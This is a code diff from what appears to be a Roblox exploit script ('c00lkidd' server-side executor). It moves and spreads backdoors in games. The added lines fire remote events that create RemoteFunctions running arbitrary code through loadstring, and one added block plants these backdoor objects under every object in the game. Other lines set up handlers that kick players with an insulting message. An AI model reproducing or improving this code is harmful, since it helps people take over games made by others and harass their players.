@@ -3032,7 +3032,7 @@ end)
 			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.LocalizationService;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
 		    fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Chat;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
 			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.Teams;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
-			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.TextChatService;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
+			fireRemoteEvent('local r=Instance.new("RemoteFunction");r.Name="rbxAssetid_core__temp_3023g78";r.Parent=game.FeatureRestrictionManager;r.OnServerInvoke=function(p)p:Kick("Use c00lkidd ss you skid bozo!")end')
             local HttpService = game:GetService("HttpService")
             local HttpService = game:GetService("HttpService")
             local HttpService = game:GetService("HttpService")
@@ -3100,13 +3100,17 @@ if request then
     })
 end
 fireRemoteEvent([[
-local r = Instance.new("RemoteFunction", game.LocalizationService)
+local r = Instance.new("RemoteFunction", game.FeatureRestrictionManager)
 r.Name = "rbx.bd_cssr6-01"
 local loadstring = require(13684410229)
-
 r.OnServerInvoke = function(_, code)
    return loadstring(code)()
 end]])
+fireRemoteEvent([[
+					for _, v in pairs(game:GetDescendants()) do 
+				       Instance.new("RemoteFunction", v).Name = "rbx.bd_cssr6-01"
+				    end
+]])
 wait(0.4)
 fireRemoteEvent([[
 for i, v in ipairs(game:GetDescendants()) do 
